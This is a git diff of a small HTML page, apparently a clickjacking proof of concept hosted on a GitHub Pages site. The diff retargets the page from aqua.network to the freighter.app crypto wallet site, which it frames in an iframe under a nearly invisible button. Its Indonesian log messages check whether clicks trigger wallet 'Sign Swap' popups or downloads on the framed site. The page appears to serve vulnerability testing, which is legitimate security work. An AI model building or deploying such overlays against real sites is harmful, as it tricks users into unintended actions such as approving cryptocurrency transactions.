@@ -3,34 +3,33 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
-<title>Clickjacking REAL Test</title>
+<title>Clickjacking Test - freighter.app</title>
 <style>
 body{margin:0;font-family:monospace;background:#000;color:#fff;padding:10px}
-#container{position:relative;width:100%;height:650px;border:2px solid #333;overflow:hidden}
+#container{position:relative;width:100%;height:700px;border:2px solid #333;overflow:hidden;background:#fff}
 #victim{position:absolute;top:0;left:0;width:100%;height:100%;border:none;opacity:1;z-index:1}
-#attacker{position:absolute;top:355px;left:50%;transform:translateX(-50%);width:280px;height:65px;z-index:10;opacity:0.01;background:red;cursor:pointer;border:none}
-#label{position:absolute;top:320px;left:50%;transform:translateX(-50%);z-index:5;background:rgba(255,0,102,0.9);padding:8px 15px;border-radius:20px;font-size:11px;pointer-events:none}
-#log{background:#111;border:1px solid #333;padding:10px;margin-top:10px;font-size:11px;height:120px;overflow-y:auto}
+#attacker{position:absolute;top:300px;left:50%;transform:translateX(-50%);width:300px;height:70px;z-index:10;opacity:0.02;background:red;cursor:pointer}
+#label{position:absolute;top:260px;left:50%;transform:translateX(-50%);z-index:5;background:#ff0066;padding:10px 20px;border-radius:8px;font-size:12px;pointer-events:none;color:#fff;font-weight:bold}
+#log{background:#111;border:1px solid #333;padding:10px;margin-top:10px;font-size:11px;height:100px;overflow-y:auto;color:#0f0}
 </style>
 </head>
 <body>
-<h3>Clickjacking REAL Test</h3>
-<p>Parent: 0x403for.github.io (TRANSPARENT overlay)</p>
-<p>Child: aqua.network (victim)</p>
+<h3>Clickjacking Test - freighter.app</h3>
+<p>Parent: 0x403for.github.io</p>
+<p>Child: https://freighter.app/</p>
 <div id="container">
-  <iframe id="victim" src="https://aqua.network" onload="log('aqua.network loaded - NO X-Frame-Options!')"></iframe>
-  <div id="label">⬇️ KLIK DISINI (area SWAP NOW) ⬇️</div>
+  <iframe id="victim" src="https://freighter.app/" onload="log('freighter.app LOADED - VULNERABLE! No X-Frame-Options')"></iframe>
+  <div id="label">⬇️ INVISIBLE BUTTON DI SINI ⬇️</div>
   <button id="attacker" onclick="clicked()">INVISIBLE</button>
 </div>
-<div id="log"></div>
+<div id="log">Loading freighter.app...</div>
 <script>
 const logEl=document.getElementById('log');
 function log(m){const d=document.createElement('div');d.textContent=`[${new Date().toLocaleTimeString()}] ${m}`;logEl.appendChild(d)}
 function clicked(){
-  log('INVISIBLE BUTTON CLICKED! Cek apakah popup Freighter muncul?');
-  setTimeout(()=>{alert('Invisible clicked. Ada popup Sign Swap Freighter? Kalau YA = BUG!')},100);
+  log('INVISIBLE CLICKED! Cek apakah tombol freighter.app belakang ke-trigger?');
+  alert('Invisible clicked. Kalau ada download / navigasi = BUG!');
 }
-log('Ready. Klik di area SWAP NOW ungu.');
 </script>
 </body>
 </html>
